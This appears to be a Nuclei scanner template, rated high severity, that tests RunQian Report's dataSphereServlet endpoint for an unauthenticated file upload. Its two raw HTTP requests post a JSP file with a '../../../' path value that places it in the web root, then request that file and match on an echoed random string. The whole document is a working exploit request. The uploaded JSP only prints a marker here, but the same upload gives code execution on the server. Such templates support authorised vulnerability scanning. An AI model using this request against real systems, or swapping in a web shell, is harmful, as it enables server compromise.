id: RunQianReport-dataSphereServlet-fileupload
info:
  name: RunQianReport-dataSphereServlet-fileupload
  author: yunkong
  severity: high
  description: 润乾报表dataSphereServlet接口文件上传
  reference:
    - https://

variables:
  random_uri: "{{rand_base(5, 'abc')}}"
  random_str: "{{rand_base(5, 'abc')}}"

http:
  - raw:
      - |-
        POST /servlet/dataSphereServlet?action=38 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Length: 390
        Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="openGrpxFile"; filename="{{random_uri}}.jsp"
        Content-Type: text/plain

        <% out.println("{{random_str}}"); %>
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="path"

        ../../../
        --eac629ee4641cb0fe10596fba5e0c5d9
        Content-Disposition: form-data; name="saveServer"

        1
        --eac629ee4641cb0fe10596fba5e0c5d9--
      - |+
        GET /{{random_uri}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '{{random_str}}'
      - type: status
        status:
          - 200